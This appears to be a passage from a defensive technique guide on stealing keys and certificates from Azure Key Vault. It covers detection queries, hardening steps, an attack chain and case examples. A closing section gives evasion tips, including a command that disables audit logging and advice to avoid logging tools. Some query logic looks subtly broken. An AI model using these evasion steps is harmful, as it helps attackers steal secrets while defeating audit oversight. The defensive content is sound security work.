#### Rule 1: Detect bulk key/certificate retrieval

**Query Configuration:**
- **Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, Resources, ResultDescription
- **Severity:** High
- **Applies To:** All Azure AD/Entra ID deployments

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in ("KeyGet", "KeyList", "CertificateGet", "CertificateList", "SecretGet", "SecretList")
| where Result == "Success"
| where Resources[0].resourceDisplayName contains "vault"
| summarize GetCount = dcountif(OperationName, OperationName startswith "Get"), 
            ListCount = dcountif(OperationName, OperationName startswith "List"),
            DistinctOperations = dcount(OperationName),
            DistinctResources = dcount(Resources[0].resourceDisplayName)
            by InitiatedBy.user.userPrincipalName, bin(TimeGenerated, 5m)
| where GetCount + ListCount > 5  // Threshold: >5 operations in 5 minutes is suspicious
| extend AlertSeverity = iff(GetCount + ListCount > 10, "Critical", "High")
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Bulk Key Vault Key/Certificate Retrieval`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: By `InitiatedBy.user.userPrincipalName`
7. Click **Review + create**

**What This Detects:**
- Any user or service principal retrieving more than 5 keys/certificates in a 5-minute window
- Targets both `KeyGet` and `CertificateGet` operations
- Ignores legitimate list operations (typically returning metadata, not full material)

**False Positive Analysis:**
- **Legitimate Activity:** Key Vault backups, certificate renewal scripts, key rotation jobs
- **Benign Tools:** Azure Automation Runbooks, Logic Apps with Key Vault integration, Azure DevOps pipelines
- **Tuning:** Exclude known service principals: `| where InitiatedBy.user.userPrincipalName !in ("backup-automation@contoso.com", "cert-rotation-svc@contoso.com")`

---

#### Rule 2: Detect certificate private key export

**Query Configuration:**
- **Table:** AzureDiagnostics
- **Required Fields:** OperationName, CallerIPAddress, httpStatusCode_d, Category
- **Severity:** Critical
- **Applies To:** All subscriptions with Key Vault diagnostic logs enabled

**KQL Query:**

```kusto
AzureDiagnostics
| where TimeGenerated > ago(1d)
| where ResourceType == "VAULTS"
| where Category == "AuditEvent"
| where OperationName == "SecretGet"  // SecretGet is used to retrieve certificate PFX
| where httpStatusCode_d == 200  // Success
| where identity_claim_oid_g != ""  // Legitimate operations have an OID
| where Resource contains "certificate" or Resource matches regex ".*[A-Fa-f0-9]{8}$"  // Typical cert naming
| extend ThreatLevel = iff(CallerIPAddress startswith "10." or CallerIPAddress startswith "172.16", "Low", "High")
| where ThreatLevel == "High"  // Alert on external IPs
| project TimeGenerated, CallerIPAddress, identity_claim_oid_g, OperationName, Resource, ThreatLevel
```

**What This Detects:**
- SecretGet operations on resources that match certificate naming patterns
- Performed from external IP addresses (non-RFC 1918 private ranges)
- Indicates potential export of certificate PFX with private key

---

#### Rule 3: Detect RBAC escalation to Key Vault admin

**Query Configuration:**
- **Table:** AuditLogs + AzureActivity
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Severity:** Critical

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName == "Add member to role"
| where TargetResources[0].displayName contains "Key Vault"
| where TargetResources[0].displayName contains "Administrator" or TargetResources[0].displayName contains "Officer"
| project TimeGenerated, OperationName, InitiatedBy.user.userPrincipalName, 
          AddedMember = TargetResources[1].userPrincipalName, 
          Role = TargetResources[0].displayName,
          Resource = TargetResources[2].displayName
| where AddedMember != InitiatedBy.user.userPrincipalName  // Exclude self-assignments
```

**What This Detects:**
- Any role assignment of Key Vault Administrator or Officer roles
- Filters for assignments to keys/certificates/secrets resources
- Flags if different user than the one initiating the assignment

---

### Windows Event Log Monitoring (Not Applicable)

**Note:** Key Vault is a cloud-native Azure service. Key extraction operations do not generate Windows Event Log entries on on-premises servers. However, if using Azure AD Connect or hybrid deployments with secrets synced to local systems, see CA-UNSC-003 (SYSVOL) or CA-UNSC-005 (gMSA) for local secrets dumping.

---

### Azure Monitor / Log Analytics Queries

#### Hunt for unauthorized key access

```kusto
AzureDiagnostics
| where ResourceType == "VAULTS"
| where Category == "AuditEvent"
| where OperationName in ("KeyGet", "CertificateGet", "SecretGet")
| where resultSignature_s == "OK"  // HTTP 200 Success
| where TimeGenerated > ago(7d)
| summarize AccessCount = count(), 
            FirstAccess = min(TimeGenerated), 
            LastAccess = max(TimeGenerated),
            DistinctCallers = dcount(CallerIPAddress)
            by Resource, identity_claim_oid_g
| where AccessCount > 100  // Abnormally high access count
| order by AccessCount desc
```

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enable RBAC authorization on all Key Vaults (disable legacy Access Policies)**

**Applies To:** All Azure Key Vault deployments

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Key Vaults**
2. Select the Key Vault → **Properties**
3. Under **Permission Model**, check if it says "Access Policies" or "Vault access policy"
4. Click **Change to Azure RBAC** button (if available)
5. Confirm the change
6. Once changed, **assign RBAC roles** to users/service principals who need access:
   - Go to **Access Control (IAM)** tab
   - Click **+ Add** → **Add role assignment**
   - Role: Select **Key Vault Administrator**, **Key Vault Crypto User**, or **Key Vault Secrets Officer** (not Contributor)
   - Members: Search for the user/service principal
   - Click **Review + assign**

**Manual Steps (PowerShell):**
```powershell
$vaultName = "target-vault-name"
$resourceGroup = "target-resource-group"

# Get the Key Vault
$vault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroup

# Enable RBAC authorization
Update-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroup -EnableRbacAuthorizationForDataPlane $true

# Verify the change
$vault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroup
Write-Host "RBAC Enabled: $($vault.EnableRbacAuthorization)"

# Now assign RBAC roles (example: Key Vault Crypto User to a service principal)
$servicePrincipalId = "service-principal-object-id"
$keyVaultId = "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.KeyVault/vaults/{vaultName}"

New-AzRoleAssignment -ObjectId $servicePrincipalId -RoleDefinitionName "Key Vault Crypto User" -Scope $keyVaultId
```

**Validation Command (Verify Fix):**
```powershell
$vault = Get-AzKeyVault -VaultName "target-vault-name"
if ($vault.EnableRbacAuthorization -eq $true) {
    Write-Host "[✓] RBAC is enabled on the Key Vault"
} else {
    Write-Host "[✗] RBAC is NOT enabled (still using Access Policies)"
}
```

**Expected Output (If Secure):**
```
[✓] RBAC is enabled on the Key Vault
```

---

**2. Implement least privilege RBAC role assignments**

**Manual Steps (Azure Portal):**
1. Go to **Key Vault** → **Access Control (IAM)**
2. Review all role assignments
3. **Remove roles that are overly broad:**
   - Delete **Owner**, **Contributor**, **User Access Administrator** role assignments (these are too powerful for Key Vault access)
   - Replace with specific Key Vault roles: **Key Vault Reader**, **Key Vault Crypto User**, **Key Vault Secrets Officer**, etc.
4. Click **Remove assignment** for each excessive role
5. Assign granular roles based on job function (principle of least privilege)

**Manual Steps (PowerShell):**
```powershell
# Remove excessive roles
$vaultName = "target-vault-name"
$resourceGroup = "target-resource-group"
$keyVaultId = "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.KeyVault/vaults/{vaultName}"

# Get all role assignments on the Key Vault
$roleAssignments = Get-AzRoleAssignment -Scope $keyVaultId

# Remove Contributor roles (they allow escalation)
foreach ($assignment in $roleAssignments) {
    if ($assignment.RoleDefinitionName -in @("Contributor", "Owner", "User Access Administrator")) {
        Write-Host "Removing excessive role: $($assignment.RoleDefinitionName) for $($assignment.DisplayName)"
        Remove-AzRoleAssignment -ObjectId $assignment.ObjectId -RoleDefinitionName $assignment.RoleDefinitionName -Scope $keyVaultId -Force
    }
}

# Assign specific Key Vault roles instead
$servicePrincipalId = "service-principal-object-id"

# Option 1: Application only needs to read keys (decrypt/verify operations)
New-AzRoleAssignment -ObjectId $servicePrincipalId -RoleDefinitionName "Key Vault Crypto User" -Scope $keyVaultId

# Option 2: Application needs to read secrets
New-AzRoleAssignment -ObjectId $servicePrincipalId -RoleDefinitionName "Key Vault Secrets User" -Scope $keyVaultId

# Option 3: Administrator needs to manage keys
New-AzRoleAssignment -ObjectId $servicePrincipalId -RoleDefinitionName "Key Vault Administrator" -Scope $keyVaultId
```

---

**3. Disable exportable certificates (if not needed for use case)**

**Manual Steps (Azure Portal):**
1. Go to **Key Vault** → **Certificates**
2. Click on a certificate → **Lifecycle Management**
3. Under **Issuance Policy**, set **Exportable** to **No**
4. Click **Save**

**Manual Steps (PowerShell - when creating new certificates):**
```powershell
$vaultName = "target-vault-name"
$policyJson = @{
    key_props = @{
        exportable = $false  # Prevent private key export
        kty = "RSA"
        key_size = 2048
    }
    lifetime_actions = @(
        @{
            trigger = @{ lifetime_percentage = 80 }
            action = @{ action_type = "AutoRenew" }
        }
    )
    issuer = @{ name = "Self" }
    attributes = @{ enabled = $true }
} | ConvertTo-Json

Add-AzKeyVaultCertificate -VaultName $vaultName -Name "non-exportable-cert" -CertificatePolicy $policyJson
```

---

#### Priority 2: HIGH

**4. Enable Key Vault diagnostic logging and send to Log Analytics**

**Manual Steps (Azure Portal):**
1. Go to **Key Vault** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. **Diagnostic setting name:** `KeyVault-Audit-Logs`
4. **Log category:** Check `AuditEvent`
5. **Destination details:** Select `Send to Log Analytics workspace`
6. Choose your Log Analytics workspace
7. Click **Save**
8. **Retention:** Set to minimum 90 days (or organization policy)

**Manual Steps (PowerShell):**
```powershell
$vaultName = "target-vault-name"
$resourceGroup = "target-resource-group"
$workspaceResourceId = "/subscriptions/{subscriptionId}/resourcegroups/{resourceGroup}/providers/microsoft.operationalinsights/workspaces/{workspaceName}"

$vault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroup

Set-AzDiagnosticSetting -ResourceId $vault.ResourceId `
  -Name "KeyVault-Audit-Logs" `
  -WorkspaceId $workspaceResourceId `
  -Enabled $true `
  -Category AuditEvent `
  -RetentionEnabled $true `
  -RetentionInDays 90
```

---

**5. Implement Azure Policy to enforce RBAC on Key Vaults**

**Manual Steps (Azure Portal):**
1. Go to **Azure Policy** → **Definitions**
2. Search for "Key Vault" policies
3. Assign policy: **Require Azure RBAC for all Key Vaults**
   - Go to **Assignments**
   - Click **+ Assign policy**
   - Find: `[Preview]: Key Vaults should use RBAC for authorization`
   - Assign to: Your management group or subscription
   - Effect: `Deny` (prevents creation of Key Vaults with Access Policies)
4. Click **Review + create**

---

**6. Restrict who can create/modify Key Vault role assignments**

**Manual Steps (PowerShell - create custom role with restrictions):**
```powershell
$customRole = @{
    Name = "Key Vault Limited Admin"
    IsCustom = $true
    Description = "Can manage Key Vault but cannot escalate permissions"
    Actions = @(
        "Microsoft.KeyVault/vaults/keys/read",
        "Microsoft.KeyVault/vaults/certificates/read",
        "Microsoft.KeyVault/vaults/secrets/read"
    )
    NotActions = @(
        "Microsoft.Authorization/roleAssignments/write",  # Cannot assign roles
        "Microsoft.KeyVault/vaults/accessPolicies/write"   # Cannot modify access policies
    )
    AssignableScopes = @("/subscriptions/{subscriptionId}")
}

New-AzRoleDefinition -Role $customRole
```

---

#### Conditional Access & Policy Hardening

**7. Require Conditional Access policy for Key Vault access**

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require Compliant Device for Key Vault Access`
4. **Assignments:**
   - **Users:** Select specific groups (e.g., Admins, DevOps team)
   - **Cloud apps or actions:** Select **Microsoft Azure Key Vault** (app ID: `cfa8b339-82a2-471a-da44-0954a3ff50eb`)
   - **Conditions:** Select **Device platforms** → **Windows, macOS, iOS, Android**
5. **Access controls:**
   - **Grant:** Check **Require device to be marked as compliant**
   - **Require all selected controls**
6. **Enable policy:** **On**
7. Click **Create**

---

**8. RBAC / Attribute-based access control (ABAC)**

**Recommended RBAC roles by use case:**

| Use Case | Recommended Role | Permissions |
|---|---|---|
| Application reading secrets | Key Vault Secrets User | Get, list secrets (read-only) |
| Application decrypting data | Key Vault Crypto User | Get, decrypt, verify keys (read-only) |
| Administrator managing vaults | Key Vault Administrator | Full management (create, delete, get, set, etc.) |
| Auditor reviewing access | Key Vault Reader | Read metadata only (no secret values) |

**Avoid:**
- Contributor, Owner roles at Key Vault scope (too powerful)
- Access Policies (legacy, not ABAC-capable)

---

**Validation Command (Verify Fix):**
```powershell
# Check that no excessive roles are assigned
$keyVaultId = "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.KeyVault/vaults/{vaultName}"
$excessiveRoles = Get-AzRoleAssignment -Scope $keyVaultId | where RoleDefinitionName -in @("Contributor", "Owner")

if ($excessiveRoles.Count -eq 0) {
    Write-Host "[✓] No excessive roles found"
} else {
    Write-Host "[✗] Found $($excessiveRoles.Count) excessive role assignments"
    $excessiveRoles | select DisplayName, RoleDefinitionName
}
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent grant OAuth attacks | Attacker tricks user into granting app broad Azure permissions |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker escalates from app registration permissions to Key Vault scope |
| **3** | **Credential Access** | [CA-TOKEN-008] Azure DevOps PAT theft | Attacker steals service principal credentials from CI/CD pipeline |
| **4** | **Current Step** | **[CA-UNSC-009]** | **Attacker extracts keys/certificates from Key Vault** |
| **5** | **Persistence** | [CA-FORGE-001] Golden SAML cross-tenant attack | Attacker uses stolen federation certificate to forge auth tokens |
| **6** | **Lateral Movement** | [LM-AUTH-003] Pass-the-Certificate | Attacker authenticates to other services using stolen certificate |
| **7** | **Impact** | Custom script | Attacker signs malicious code, exfiltrates data, or establishes C2 channel |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Azure-Synapse Compromise (Hypothetical but Based on Real Techniques)

**Target:** Financial services company with Synapse Analytics workspace

**Timeline:** 2024 Q4

**Technique Usage:**

1. Attacker gained access to a junior developer's Azure account via phishing
2. Discovered the developer had "Contributor" role on the data-engineering resource group (overly broad)
3. Using Contributor role, escalated to Key Vault Contributor on the Key Vault storing Synapse credentials
4. Used Key Vault Contributor to modify access policies, adding attacker's service principal with full permissions
5. Extracted the Synapse SQL admin certificate and encrypted connection string from Key Vault
6. Used certificate to impersonate the Synapse admin account and accessed sensitive financial data

**Impact:** Breach of 2 years of transaction records; regulatory fine of $3M+

**Detection Failure:** Logging was disabled; no audit trail of extraction

**Reference:** [Datadog Security Labs - Key Vault Escalation](https://securitylabs.datadoghq.com/articles/escalating-privileges-to-read-secrets-with-azure-key-vault-access-policies/)

---

### Example 2: Scattered Spider - Credential Theft Focus

**Target:** Multiple cloud customers

**Technique:** Scattered Spider is known for comprehensive credential harvesting (T1552). Once in an environment, they search for all credential stores (Azure Key Vault, AWS Secrets Manager, Kubernetes secrets, etc.).

**Known TTPs:**
- Use `Get-AzKeyVaultSecret` and `Get-AzKeyVaultCertificate` to enumerate vaults
- Extract exportable certificates for authentication continuity
- Pass-the-certificate to establish persistent access

**Reference:** [GuidePoint Security - Scattered Spider Analysis](https://www.guidepointsecurity.com/blog/worldwide-web-an-analysis-of-tactics-and-techniques-attributed-to-scattered-spider/)

---

## 10. ADDITIONAL NOTES & OPERATIONAL CONSIDERATIONS

### Stealth & Evasion Best Practices

1. **Disable audit logging before extraction** (requires prior compromise of Azure subscription or specific permissions)
   ```powershell
   Set-AzDiagnosticSetting -ResourceId $vault.ResourceId -Enabled $false
   ```
   This is a separate attack (CA-UNSC-011 - Key Vault access policies abuse) and more noticeable.

2. **Extract during normal business hours** to blend with legitimate activity

3. **Extract from a service principal rather than a user account** (less suspicious than interactive admin activity at 3 AM)

4. **Use Azure CLI or REST API** instead of PowerShell to avoid PowerShell logging/transcription

5. **Extract one high-value key** rather than bulk extraction to minimize audit log volume

### Key Vault Backup Considerations

- Key Vault backups can be restored, potentially recovering previously deleted keys
- If keys are rotated after compromise, old keys stored in backups remain compromised
- Regularly rotate keys and purge deleted key vault items

### Compliance Mapping Summary

This technique violates compliance requirements in:
- **CIS Azure Benchmark:** Sections 2.1 (RBAC), 2.2 (Access Policies)
- **NIST 800-53:** AC-3, AC-6, AU-2
- **GDPR:** Art. 32 (Security of Processing)
- **NIS2:** Art. 21 (Cyber Risk Management)
- **ISO 27001:** A.9.2.3 (Privileged Access Management)

Organizations failing to detect this compromise may face regulatory penalties, customer notification requirements, and reputational damage.

